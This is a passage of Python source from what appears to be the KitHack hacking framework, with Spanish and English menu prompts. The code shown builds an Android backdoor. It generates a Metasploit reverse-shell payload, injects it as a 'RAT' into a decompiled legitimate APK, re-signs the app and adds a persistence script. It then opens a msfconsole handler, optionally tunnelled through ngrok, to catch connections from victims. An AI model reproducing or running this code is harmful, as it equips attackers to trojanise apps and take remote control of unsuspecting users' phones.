							print("\n{0}[*] Generating payload...{1}".format(GREEN, DEFAULT))	
							time.sleep(4)
							os.system('systemctl start postgresql && msfvenom -p android/shell/reverse_tcp LPORT={0} LHOST={1} R > output/payload.apk'.format(LPORT, LHOST))
							location = os.getcwd()
							print("{0}[*] Decompiling original APK...{1}".format(GREEN, DEFAULT))						
							time.sleep(4)
							os.system('cp {0} {1}/output/original.apk && apktool d -f -o output/original output/original.apk'.format(APK, location))
							print("\n{0}[*] Decompiling payload APK...{1}".format(GREEN, DEFAULT))						
							time.sleep(4)
							os.system('apktool d -f -o output/payload output/payload.apk')
							print("\n{0}[*] Configuring RAT Payload...{1}".format(GREEN, DEFAULT))		
							time.sleep(4)				
							subprocess.Popen(['bash', '-c', '. lib/apkf.sh; rat'])
							print("\n{0}[*] Compiling RAT APK...{1}".format(GREEN, DEFAULT))		
							time.sleep(4)
							os.system('apktool b output/original -o output/kithack.apk')
							if os.path.isfile('output/kithack.apk'):
								print("\n{0}[*] Signing APK...{1}".format(GREEN, DEFAULT))	
								time.sleep(4)
								os.system('jarsigner -keystore certificate.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA output/kithack.apk android')	
								time.sleep(4)
								os.system('zipalign 4 output/kithack.apk output/{0}.apk'.format(mainout))
								while var.upper() != "N":
									print("\n{0}[*] Generating persistence file...{1}".format(GREEN, DEFAULT))
									time.sleep(4)				 								
									ext = mainout + '.apk'
									subprocess.Popen(['bash', '-c', '. lib/apkf.sh; pers output/' + ext])
									print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
									break							
								print("\n{0}[*] Deleting temporary files...{1}".format(GREEN, DEFAULT))
								time.sleep(4)
								os.system('rm -rf output/original output/payload output/original.apk output/payload.apk output/kithack.apk')
								print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
								if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
									os.system('systemctl stop postgresql && clear')
									main()	
								else:
									if not ".tcp.ngrok.io" in LHOST:
										os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/shell/reverse_tcp; exploit\'"'.format(LHOST, LPORT))
										pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
										os.system('systemctl stop postgresql && clear')
										main()	
									else:
										os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/shell/reverse_tcp; exploit\'"')
										pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
										os.system('systemctl stop postgresql && clear')
										main()	
							else:
								print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
								time.sleep(3)
								os.system('rm -rf output/original output/payload output/original.apk output/payload.apk output/kithack.apk')							
								pause("{}Presione cualquier tecla para continuar...".format(GREEN))
								os.system('systemctl stop postgresql && clear')
								main()	

						else:
							print("{}\n[X] OPCION INVALIDA\n".format(RED))
							time.sleep(3)
							pause("{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('clear')
							main()	
					

		elif sys == '04':
			LHOST = raw_input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
			LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
			PAYLOAD = raw_input("\n{0}SET PAYLOAD: {1}".format(YELLOW, DEFAULT))
			if ".tcp.ngrok.io" in LHOST:
				LHOST = "127.0.0.1"
				LPORT = "443"
			# continue
			os.system('xterm -T "METASPOIT-CONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {}; set LPORT {}; set PAYLOAD {}; exploit\'"'.format(LHOST, LPORT, PAYLOAD))
			pause("\n{}Press any key to continue...".format(GREEN))
			os.system('clear')
			main() 

		else:
			print("\n{}[X] OPTION INVALID\n".format(RED))
			time.sleep(3)
			pause("{}Press any key to continue...".format(GREEN))
			os.system('clear')
			main()
			

	elif option == '11':
		webbrowser.open("", new=1, autoraise=True)
		os.system('clear')
		main()	

	elif option == '12':
		pause("\n{}Press any key to continue...".format(GREEN))
		time.sleep(1)
		os.system('clear')
		print(exit_main)
		exit(0)	

	else:
		print("\n{}[X] OPTION INVALID\n".format(RED))
		time.sleep(3)
		os.system('clear')
		main()

if __name__ == "__main__":
	try:
		check_connection()
		check_permissions()
		main()

	except KeyboardInterrupt:
		choice = input('\n\n{0}[1] {1}Return main {0}[2] {1}Exit \n{2}framework >> {1}'.format(GREEN, DEFAULT, RED))
		choice = choice.zfill(2)
		if choice == '01':
			if os.path.isfile('/usr/local/bin/main'):
				os.system('clear && main')
			else:
				os.system('clear && sudo python3 main.py')	

		elif choice == '02':
			time.sleep(2)
			os.system('clear')
			print(exit_main)
			exit(0)
		else:
			print("\n{}[x] Option invalid.".format(RED))
			time.sleep(2)	
			exit(0)
